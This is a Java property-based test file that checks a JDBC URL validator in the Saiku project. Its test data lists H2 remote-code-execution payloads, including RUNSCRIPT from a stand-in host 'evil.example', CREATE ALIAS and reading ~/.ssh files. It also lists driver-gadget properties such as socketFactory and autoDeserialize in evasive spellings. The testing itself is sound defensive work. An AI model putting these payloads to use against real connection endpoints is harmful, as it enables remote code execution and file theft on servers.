/*
 *   Copyright 2026 Spicule Ltd
 *   Apache License, Version 2.0.
 */
package org.saiku.proptest;

import static dev.hegel.Generators.fromRegex;
import static dev.hegel.Generators.sampledFrom;
import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertThrows;

import dev.hegel.HegelTest;
import dev.hegel.TestCase;
import java.util.List;
import org.saiku.web.rest.objects.JdbcUrlValidator;

/**
 * Property-based tests for the security-critical {@link JdbcUrlValidator}, which blocks the H2
 * "executable JDBC URL" RCE class ({@code INIT=RUNSCRIPT}, {@code CREATE ALIAS/TRIGGER},
 * {@code SHUTDOWN}) and — since saiku#1902, by delegating to the service-layer
 * {@code JdbcUrlPolicy} — the non-H2 driver-gadget families and unknown schemes. Example-based
 * tests check a handful of hand-picked strings; these properties assert the security invariant
 * holds across a generated space of URLs — including nesting and casing an attacker would actually
 * try.
 */
class JdbcUrlValidatorPropertyTest {

    /** Payloads that weaponise an H2 connection. Every one MUST be rejected, wherever it appears. */
    private static final List<String> DANGEROUS = List.of(
            ";INIT=RUNSCRIPT FROM 'http://evil.example/x.sql'",
            ";INIT=RUNSCRIPT FROM '~/.ssh/authorized_keys'",
            ";INIT=CREATE ALIAS EXEC AS $$ String x(){return \"\";} $$",
            ";INIT=CREATE TRIGGER t BEFORE SELECT ON x",
            ";SHUTDOWN");

    /** Non-H2 schemes never go through H2 token checks, so their names can be anything. */
    private static final List<String> SAFE_SCHEMES = List.of(
            "jdbc:postgresql://host:5432/",
            "jdbc:mysql://host:3306/",
            "jdbc:mariadb://host:3306/",
            "jdbc:sqlserver://host;databaseName=",
            "jdbc:oracle:thin:@host:1521:",
            "jdbc:hsqldb:mem:");

    /** A dangerous H2 URL is rejected regardless of the (arbitrary) database name. */
    @HegelTest
    void rejectsDangerousH2Urls(TestCase tc) {
        String db = tc.draw(fromRegex("[a-z][a-z0-9_]{0,15}"), "db");
        String payload = tc.draw(sampledFrom(DANGEROUS), "payload");

        String url = "jdbc:h2:mem:" + db + payload;

        assertThrows(IllegalArgumentException.class, () -> JdbcUrlValidator.validate(url));
    }

    /** Nesting the dangerous H2 URL inside a jdbc:mondrian wrapper must NOT smuggle it past. */
    @HegelTest
    void rejectsDangerousH2UrlsNestedInMondrianWrapper(TestCase tc) {
        String db = tc.draw(fromRegex("[a-z][a-z0-9_]{0,15}"), "db");
        String catalog = tc.draw(fromRegex("[a-z][a-z0-9_]{0,15}"), "catalog");
        String payload = tc.draw(sampledFrom(DANGEROUS), "payload");

        String url = "jdbc:mondrian:Jdbc=jdbc:h2:mem:" + db + payload + ";Catalog=" + catalog;

        assertThrows(IllegalArgumentException.class, () -> JdbcUrlValidator.validate(url));
    }

    /** No false positives: a benign URL on a recognised non-H2 backend is always accepted. */
    @HegelTest
    void acceptsBenignUrls(TestCase tc) {
        String scheme = tc.draw(sampledFrom(SAFE_SCHEMES), "scheme");
        String name = tc.draw(fromRegex("[a-z][a-z0-9_]{0,20}"), "name");

        String url = scheme + name;

        assertDoesNotThrow(() -> JdbcUrlValidator.validate(url));
    }

    /**
     * saiku#1902: driver-gadget connection properties — the class-loading / deserialisation /
     * local-file families (pgjdbc socketFactory, Connector/J autoDeserialize, ...) — in the
     * spellings a driver would still honour: mixed case, separator noise, percent-encoding.
     */
    private static final List<String> GADGET_PROPERTIES = List.of(
            "socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext",
            "SOCKETFACTORY=x.Y",
            "socket_factory=x.Y",
            "socket%46actory=x.Y",
            "sslfactory=x.Y",
            "autoDeserialize=true",
            "auto_deserialize=true",
            "allowLoadLocalInfile=true",
            "queryInterceptors=x.Y",
            "loggerFile=/var/www/x.jsp",
            "accessTokenCallbackClass=x.Y");

    private static final List<String> PROPERTY_SEPARATORS = List.of("?", ";", "&");

    /** A gadget property is refused on EVERY backend, whatever the database name or separator. */
    @HegelTest
    void rejectsDriverGadgetPropertiesOnEveryBackend(TestCase tc) {
        String scheme = tc.draw(sampledFrom(SAFE_SCHEMES), "scheme");
        String name = tc.draw(fromRegex("[a-z][a-z0-9_]{0,20}"), "name");
        String separator = tc.draw(sampledFrom(PROPERTY_SEPARATORS), "separator");
        String gadget = tc.draw(sampledFrom(GADGET_PROPERTIES), "gadget");

        String url = scheme + name + separator + gadget;

        assertThrows(IllegalArgumentException.class, () -> JdbcUrlValidator.validate(url));
    }

    /**
     * A JDBC sub-scheme outside the allow-list is refused whatever follows it. The generated
     * scheme is prefixed {@code zz} so it can never collide with a real, allowed driver.
     */
    @HegelTest
    void rejectsUnknownSchemes(TestCase tc) {
        String scheme = tc.draw(fromRegex("zz[a-z0-9]{1,8}"), "scheme");
        String rest = tc.draw(fromRegex("[a-z][a-z0-9_/]{0,20}"), "rest");

        String url = "jdbc:" + scheme + "://" + rest;

        assertThrows(IllegalArgumentException.class, () -> JdbcUrlValidator.validate(url));
    }
}
